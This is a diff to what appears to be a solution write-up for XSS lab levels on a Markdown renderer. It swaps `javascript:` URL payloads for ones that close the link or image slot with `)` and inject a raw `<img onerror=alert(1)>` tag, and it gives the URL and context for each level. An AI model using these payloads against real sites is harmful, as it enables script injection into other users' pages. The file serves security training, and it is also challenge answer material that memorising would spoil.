@@ -4,17 +4,17 @@ Markdown renderer bugs: missing scheme checks, raw HTML pass-through, unescaped 
 
 ### markdown-level1
 
-`/markdown/level1/?url=javascript:alert(1)`
+`/markdown/level1/?url=x)%3Cimg%20src=y%20onerror=alert(1)%3E`
 
-- payload: `javascript:alert(1)`
-- context: markdown link url slot, no scheme check, `<a href="...">`
+- payload: `x)<img src=y onerror=alert(1)>`
+- context: link url slot stops at `)`; end the link and drop a raw tag into the body
 
 ### markdown-level2
 
-`/markdown/level2/?src=javascript:alert(1)`
+`/markdown/level2/?src=x)%3Cimg%20src=y%20onerror=alert(1)%3E`
 
-- payload: `javascript:alert(1)`
-- context: markdown image src, no scheme check (img onerror also works: `x" onerror=alert(1) x="`)
+- payload: `x)<img src=y onerror=alert(1)>`
+- context: image src slot stops at `)`; end the image and drop a raw tag into the body
 
 ### markdown-level3
 
